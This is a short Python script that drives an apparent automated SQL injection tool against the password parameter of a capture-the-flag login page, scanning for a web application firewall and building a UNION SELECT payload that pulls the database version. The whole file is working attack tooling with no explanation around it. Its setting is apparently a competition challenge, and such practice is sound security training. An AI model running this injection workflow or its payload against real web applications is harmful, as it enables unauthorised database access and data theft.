import argparse, sys
sys.path.insert(0, ".")
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
from autosqli.cli import build_spec
from autosqli.core.engine import Engine
from autosqli.core.builder import PayloadBuilder
a = argparse.Namespace(url="http://702f2c2937518dc1e8b87ae8.http-ctf2.dasctf.com:80/check.php?username=admin&password=1",
    param="password", method="GET", data=None, cookie=None, header=None, stage_url="",
    dvwa="", security="low", base_value="1", delay=0.0, encode="", time_sec=0.0,
    table_hint="", empty_ok=False, flag_re="", max_requests=0, fresh=True,
    csrf_url="", csrf_re="", csrf_field="", waf_sig=None, raw_body=False, body_template="")
spec = build_spec(a)
eng = Engine(spec, log=lambda l, m: None)
rep = eng.analyze(scan_waf=True)
print("inj.form =", rep.injection.form, "| comment =", repr(rep.injection.comment))
b = PayloadBuilder(rep.injection, rep.waf)
p = b.wrap("union select null,concat_ws(0x7e7e,version(),null),null", base_value="0")
print("payload =", p)
